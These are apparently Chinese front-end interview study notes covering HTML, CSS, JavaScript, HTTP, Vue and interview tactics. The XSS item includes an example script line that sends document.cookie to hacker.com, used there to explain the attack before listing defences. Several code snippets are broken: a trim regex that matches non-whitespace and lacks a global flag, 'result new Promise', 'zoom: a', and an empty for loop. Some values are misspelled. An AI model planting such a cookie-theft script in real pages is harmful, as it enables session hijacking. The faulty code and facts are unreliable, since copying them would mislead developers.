### HTML押题
1. (必考)你是如何理解HTML语义化的？
    - 比如 用p标签表示段落，用aside标签表示边栏，用main标签表示页面的主要内容
    - 其实，最初是PHP后端来写HTML的，他们不会css，只好用table标签来写，但是我们都知道table标签是用来展示表格的，这严重违反了HTML的语义化，后来有了专门写css的，他们使用DIV+CSS，Float浮动+定位布局，就稍微符合了HTML的语义化，再后来，前端专业化，我们知道了HTML标签的各种含义，于是就用恰当的标签来展示内容，而不是都用div来布局，会尽量使用h1，p,ul,main,header等标签

2. meta viewport 是做什么用的，怎么写？
    - `<meta name="viewport" content="width=device-width,user-scalable=no,iniyial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0">`
    - 设备宽度，用户不能放大缩小，控制页面在移动端不要缩放显示


### CSS押题
1. 浏览器内核
    - IE浏览器内核、百度浏览器：Trident内核，也是俗称的IE内核；
    - Chrome浏览器内核: Chrome内核,以前是Webkit内核，现在是Blink内核；
    - Firefox浏览器内核: Gecko内核，俗称Firefox内核；
    - Safari浏览器内核：Webkit内核；
    - Opera浏览器内核: 最初是自己的Presto内核，后来加入谷歌大军，从Webkit又到了Blink内核；
    - 360浏览器、猎豹浏览器内核：IE+Chrome双内核；
    - 搜狗、遨游、QQ浏览器内核：Trident（兼容模式）+Webkit（高速模式）；

1. 说一下盒模型 box-sizing
    - content-box(标准): 宽高是内容区宽高
    - border-box(IE): 宽高包括 padding值和border值 (兼容IE时不适用)
    - 解释一下弹性盒模型flexbox，以及使用场景
2. css reset 和 normalize.css 有什么区别？
    - css reset：样式重置，抛弃默认样式，因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。
    - normalize.css：让所有浏览器的标签都和标准规定的默认样式一致
3. (必考)如何居中
    - 水平居中
        - 内联：爸爸身上 写 text-align:center
        - 块级：margin-left:auto;margin-right:auto;

    - [垂直居中](https://jscode.me/t/topic/1936)
    - 水平垂直居中

5. BFC是什么？
    - overflow:hidden; 清除浮动 （用.clearfix 清除浮动）
    - overflow:hidden; 取消父子 margin 合并（用 父级+ padding-top：0.1px；）

6. 如何清除浮动
    - 父级加 Height ：只适合固定高度
    - 结尾处加空div标签 clear{clear:both;}
        - 原理：添加一个空div，利用css提高的clear:both清除浮动，让父级div能自动获取到高度 
    - overflow:hidden;浏览器会自动检查浮动区域的高度 ， (不好) 超出部分被影藏，后遗症多
    - .clearfix  完美

        ```
        .clearfix::after{
            content: "";
            display: block;
            clear: both;
            zoom: a;  // 兼容IE 加
        }
        ```
        
7. position：的值
    - absoulte: 基于有定位属性的父元素定位
    - relative: 基于自己本身定位
    - fixed: 基于可是窗口定位
8. display有哪些值？说明他们的作用?
    - inline（默认）–内联
    - none–隐藏
    - block–块显示
    - table–表格显示
    - list-item–项目列表
    - inline-block  
    
8. 如何隐藏一个元素（不少于7中）
    - dispaly: none;  不显示对应的元素，在文档布局中不再分配空间（回流+重绘)
    - visibility: hidden;  隐藏对应元素，在文档布局中仍保留原来的空间（重绘）
    - 
    
9. 将footer固定在底部的方法
10. css预处理器，sass中常用的有哪些
11. css优化，提高性能的方法
12. 浏览器是如何解析css选择器的
13. css选择器优先级如何确定
    - 选择器越具体，优先级越高， #div > .div
    - 同样优先级，写在后面的覆盖前面的
    - color: red !importanr; 优先级最高
14. CSS选择器有哪些？哪些属性可以继承？
    - CSS选择符：id选择器(#myid)、类选择器(.myclassname)、标签选择器(div, h1, p)、相邻选择器(h1 + p)、子选择器（ul > li）、后代选择器（li a）、通配符选择器（*）、属性选择器（a[rel=”external”]）、伪类选择器（a:hover, li:nth-child）

    - 可继承的属性：font-size, font-family, color

    - 不可继承的样式：border, padding, margin, width, height

    - 优先级（就近原则）：!important > [ id > class > tag ]
    - !important 比内联优先级高
14. CSS3新增伪类有那些?
    - p:first-of-type 选择属于其父元素的首个元素
    - p:last-of-type 选择属于其父元素的最后元素
    - p:only-of-type 选择属于其父元素唯一的元素
    - p:only-child 选择属于其父元素的唯一子元素
    - p:nth-child(2) 选择属于其父元素的第二个子元素
    - :enabled :disabled 表单控件的禁用状态。
    - :checked 单选框或复选框被选中。
    
15. CSS3有哪些新特性？
    - RGBA和透明度
    - background-image background-origin(content-box/padding-box/border-box) background-size background-repeat
    - word-wrap（对长的不可分割单词换行）word-wrap：break-word

    - 文字阴影：text-shadow： 5px 5px 5px #FF0000;（水平阴影，垂直阴影，模糊距离，阴影颜色）

    - font-face属性：定义自己的字体

    - 圆角（边框半径）：border-radius 属性用于创建圆角

    - 边框图片：border-image: url(border.png) 30 30 round

    - 盒阴影：box-shadow: 10px 10px 5px #888888

    - 媒体查询：定义两套css，当浏览器的尺寸变化时会采用不同的属性   
    
    
        
### Javascript押题

1. JS数据类型
    - number(NaN)，string，boolean，null,undefined,object,symbol
    - object包括：数组，函数，正则，日期

2. (必考)Promise怎么使用？
    - then: 
    
        ```
        $.ajax().then(成功函数，失败函数)
        ```
    - 链式: 只要前面函数没有报错，都会调用成功函数2或者失败函数2
        
        ```
        $.ajax().then(成功函数1，失败函数1).then(成功函数2，失败函数2)
        ```
    - 如何自己生成promise
    
        ```
         function xxx() {
            return new Promise(function (resolve,reject) {
                setTimeout(() => {
                    resolve() 或者 reject（）
                },3000)
            })
         }
         
         xxx().then(...)
        ```

3. (必考) ajax 手写以下 (四步)
    
    ```
    let xhr = new XMLHttpRequest()
    xhr.open('GET','/xxx')
    xhr.onreadystatechange =function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            console.log(xhr.responseText)
        }
    }
    xhr.send('a=1&b=2')
    ```

4. (必考) 闭包是什么 [闭包](https://zhuanlan.zhihu.com/p/22486908)
    - 闭包 + 立即执行函数 
    
    ```
    function createAdder() {
        let n = 0 // 局部变量
        return function () {
            n+=1
        }
    }
    
    let adder = createAdder()
    adder() // n === 1
    adder() // n === 2
    console.log(n) n is not defined
    ```
5. (必考) this指的是什么 [this](http://web.jobbole.com/91014/)
    - fn(): this指的是window
    - fn() 是 strict mode(严格模式)，this是undefined
    - a.b.c.fn() this: a.b.c
    - new Fn() ,this指向新生的实例
    - （）=> console.log(this) this 就是外面的this


6. (必考) 立即执行函数
    - 目的:造出一个作用域，防止污染全局变量

    ```
    ;(function (){
        var name
    }())
    ;(function (){
        var name
    })()
    !!!function (){
        var name
    }()
    ~function (){
        var name
    }()
    ```
    
    - ES6 新语法
    
    ```
    {
        var name
    }
    ```

7. async/await 语法了解吗？
    - 目的：把异步代码写成同步代码

    ```
    function returnPromise() {
        result new Promise ( (resolve,reject) => {
            setTimeout(() => {
                resolve('resolved')
            },2000)
        })
    } 
    
    // 以前写法
    returnPromise().then( (result) => {
        result = 'resolved'
    })
    
    // 异步变同步
    async function asyncCall () {
        let result = await returnPromise()
    }
    asyncCall()
    
    ```

8. 如何实现深拷贝
    - JSON 来深拷贝
        - 缺点：JSON不支持函数，引用，undefined，正则regexp，Date...
    
        ```
        var a = {...}
        var b = JSON.parse(JSON.stringify(a))
        ```    
    - 使用递归的方式拷贝,查找完整代码
    
    ```
    function clone (object) {
        var object2
        // 先判断是不是普通类型
        if (!(object instanceof Object)) {
        }else if (object instanceof Array) {
            object2 = []
        }else if (object instanceof Function ) {
            object2 = eval(object.toString())
        }else if (object instanceof Object) {
            object2 = {}
        }
        
        for(){
            object2[key] = clone(object[key])
        }
        return object2
    }
    ```

9. 如何实现数组去重
    - 计数排序的逻辑(一般if else的方法，只能正整数)
    - Set去重 `Array.from(new Set(arr))`

10. 如何用正则实现 string.trim()?
    
    ```
    function trim(string){
        return string.replace(/^\S+|\s+$/,'')
    }
    ```

11. JS原型是什么？ [原型](https://zhuanlan.zhihu.com/p/23090041?refer=study-fe)
    - 比如数组 a = [1,2,3],自身并没有 push 方法，但却可以使用，a通过 `__proto__ ` 找到到 `Array.prototype`,继而找到 `Array.prototype.push` 这个方法，`Array.prototype`中还有许多其他方法，如 pop，slice，splice，join等，`Array.prototype`就是 数组a的原型
12. ES6的class
    - MDN class章节

13. jS如何实现继承
    - 原型链
    
14. `==` 相关题目放弃
    - (a == 1 && a == 2 && a == 3)可能成为true吗？
    - 可能
    
    ```
    a = {
        value: 0,
        toString() {
            a.value += 1
            return a.value
        }
    }
    a == 1
    a == 2
    a == 3
    ```
    
    
### DOM押题
1. DOM事件模型 [DOM](http://jsbin.com/raqakog/1/edit?js,console,output)
    1. 冒泡
    2. 捕获
    3. 如果这个元素是被点击的元素,那么捕获不一定在冒泡之前，顺序是由监听顺序决定的 
    4. DOM事件流  
2. 移动端的触摸事件了解吗？
    - touchstart touchmove touchend touchcancel
    - 模拟swipe事件: 记录两次touchmove的位置差，如果最后一次在前一次的右边，说明向右滑了

3. 事件委托是什么，有什么好处？ [事件委托](https://github.com/FrankFang/wheels/blob/master/lib/dom/index.js)
    - 假设父元素有4个儿子，我不监听4个儿子，而是监听父元素，看触发的事件元素是哪个儿子，触发后，事件冒泡到监听元素上，然后监听元素捕捉到事件，然后处理
    - 好处：可以监听动态生成的元素，省监听器
 
4. DOM: 0级，1级，2级事件是什么
5. event对象下常见的方法有哪些
6. 如何定义一个事件



    
#### HTTP押题
1. HTTP状态码是什么
2. 301和302的区别
    - 301 永久重定向，浏览器会记住
    - 302 临时重定向

3. HTTP 缓存怎么做？
    - Cache-Control: max-age=300
    - http://cdn.com/1.js?v=1 避开缓存

4. Cache-Control 和 Etag 的区别是什么？
    - 搜饥人谷视频

5. Cookie 是什么？Session 是什么？
    - Cookie
        - HTTP响应通过 Set-Cookie 设置 Cookie
        - 浏览器访问指定域名是必须带上 Cookie 作为 Request Header
        - Cookie 一般用来记录用户信息
    - Session
        - Session 是服务器端的内存（数据）
        - Session 一般通过在 Cookie 里记录 SessionID 实现
        - SessionID 一般是随机数

6. LocalStorage 和 Cookie 的区别是什么？
    - Cookie 会随请求被发到服务器上，而 LocalStorage 不会
    - Cookie 大小一般4k以下，LocalStorage 一般5Mb 左右

7. （必考）GET 和 POST 的区别是什么？
    - 参数。GET 的参数放在 url 的查询参数里，POST 的参数（数据）放在请求消息体里。
    - 安全（扯淡）。GET 没有 POST 安全（都不安全）
    - GET 的参数（url查询参数）有长度限制，一般是 1024 个字符。POST 的参数（数据）没有长度限制（扯淡，4~10Mb 限制）
    - 包。GET 请求只需要发一个包，POST 请求需要发两个以上包（因为 POST 有消息体）（扯淡，GET 也可以用消息体）
    - GET 用来读数据，POST 用来写数据，POST 不幂等（幂等的意思就是不管发多少次请求，结果都一样。）

8. 必考）怎么跨域？JSONP 是什么？CORS 是什么？postMessage 是什么？
    - JSONP
    - CORS
    - postMessage 看一下 MDN
   
   
     
### jquery押题
1. onload()函数和JQuery中`$(document).read(function () {})` 和 `$(function () {})` 的区别
2. jQuery中遍历节点的方法有哪些
3. jQuery中操作属性和样式的方法有哪些
4. jQuery中如何克隆(复制)和删除节点
5. jQuery中如何进行内容操作
6. jQ中html(),text(),val()的区别
7. jQ中find(),has(),filter()的区别
8. JQ中closet()和parents()的区别
9. jQ中如何对选择器进行性能优化
     
   
    

#### vue押题
1. （必考）Vue 有哪些生命周期钩子函数？
    - [看文档](https://cn.vuejs.org/v2/api/#选项-生命周期钩子)
    - （必考）Vue 如何实现组件通信？
2. （必考）Vue 如何实现组件通信？
    - 父子通信（使用 Prop 传递数据、使用 v-on 绑定自定义事件）
    - 爷孙通信（通过两对父子通信，爷爸之间父子通信，爸儿之间父子通信）
    - [兄弟通信（new Vue() 作为 eventBus）](https://cn.vuejs.org/v2/guide/components.html#%E9%9D%9E%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E7%9A%84%E9%80%9A%E4%BF%A1)

3. Vuex 的作用是什么？
    - [看文档](https://vuex.vuejs.org/zh-cn/intro.html)
4. VueRouter 路由是什么？
    - 看文档

5. Vue 的双向绑定是如何实现的？有什么缺点？
    - [看文档](https://cn.vuejs.org/v2/guide/reactivity.html)
6. Computed 计算属性的用法？跟 Methods 的区别。
    - [参考](https://zhuanlan.zhihu.com/p/33778594)
7. MVVM框架的核心思想
    -  module，view，viewModule通过双向绑定，操作数据来驱动ui
    - 动态模板 ：核心机制，页面就是模板
    - 静态模板：单独把模板放一块，


#### 算法押题  
1. 排序算法（背诵冒泡排序、选择排序、计数排序、快速排序、插入排序、归并排序）
2. 二分查找法
    
#### 安全押题

1. 什么是 XSS 攻击？如何预防？

    ```
    div.innerHTML = userComment  // userComment 内容是 <script>$.get('http://hacker.com?cookie='+document.cookie)</script>
// 恶意就被执行了，这就是 XSS
    ```
    - 预防:不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行
    - 如果你一样要用 innerHTML，字符过滤
        - 把 < 替换成 &lt;
        - 把 > 替换成 &gt;
        - 把 & 替换成 &amp;
        - 把 ’ 替换成 &#39;
        - 把 ’ 替换成 &quot;
        - 代码 div.innerHTML = userComment.replace(/>/g, ‘&lt;’).replace…
    - 使用 CSP Content Security Policy


2. 什么是 CSRF 攻击？如何预防？
    - 过程:
        - 用户在 qq.com 登录
        - 用户切换到 hacker.com（恶意网站）
        - hacker.com 发送一个 qq.com/add_friend 请求，让当前用户添加 hacker 为好友。
        - 用户在不知不觉中添加 hacker 为好友。
        - 用户没有想发这个请求，但是 hacker 伪造了用户发请求的假象。
    - 避免
        - 检查 referer，qq.com 可以拒绝来自 hacker.com 的请求
        - csrf_token 来解决


#### Webpack 题
1. 转译出的文件过大怎么办？
    - 使用 code split
    - 写法  import(‘xxx’).then(xxx=>{console.log(xxx)})
    - xxx 模块就是按需加载的

2. 转译速度慢什么办？
    - webpack 慢 怎么办，搜一下
3. 写过 webpack loader 吗？[参考](http://www.alloyteam.com/2016/01/webpack-loader-1/)


#### 发散题
1. 从输入 URL 到页面展现中间发生了什么？
    - DNS 查询 DNS 缓存
    - 建立 TCP 连接（三次握手）连接复用
    - 发送 HTTP 请求（请求的四部分）
    - 后台处理请求
        - 监听 80 端口
        - 路由
        - 渲染 HTML 模板
        - 生成响应
    - 发送 HTTP 响应
    - 关闭 TCP 连接（四次挥手）
    - 解析 HTML
    - 下载 CSS（缓存
    - 解析 CSS
    - 下载 JS（缓存
    - 解析 JS
    - 下载图片
    - 解析图片
    - 渲染 DOM 树
    - 渲染样式树
    - 执行 JS

2. 你没有工作经历吗？
    - 一开始就问，可以拜拜。
    - 中间问最后问，他想压价。
    - 解法：用项目打动它：你看下我的作品，跟一年经验的前端差距大吗？你们团队一年工作经验的前端，写的出来我这样的作品吗？凭我的作品，我觉得我可以胜任贵司的工作。

3. 你遇到过最难的问题是什么？
    - [参考](https://www.zhihu.com/question/35323603/answer/338796153)
4. 你的期望薪资是多少？ 你想要的工资 加 1000~2000。
5. 任何你不会的问题
    - 承认不会
    - 询问详细细节：你问的是不是XXX方面的知识？请问你想问的是哪方面知识？
    - 根据面试官的回答，向有利于自己的方向引导话题。
    

#### 刁钻代码题
1. map加parseInt
    
    ```
    [1,2,3].map(parseInt)
    parseInt(1,0, array) // 1
    parseInt(2,1, array) // NaN
    parseInt(3,2, array) // NaN
    ```

2. a.x = a = {}
    
    ```
    var a = {n:1};
    var b = a;
    a.x = a = {n:2};
    
    问 a.x 是多少？ // undefined a.x是之前的a，现在的a.x不存在
    ```
3. (a == 1 && a== 2 && a==3) 可能为 true 吗？
    
    ```
    a = {
      value: 0,
      toString(){
        a.value += 1
        return a.value 
      }
    }
    ```

### 学习网站
1. stack Overflow
2. 掘金
3. 谷歌
4. CNode社区
5. 知乎

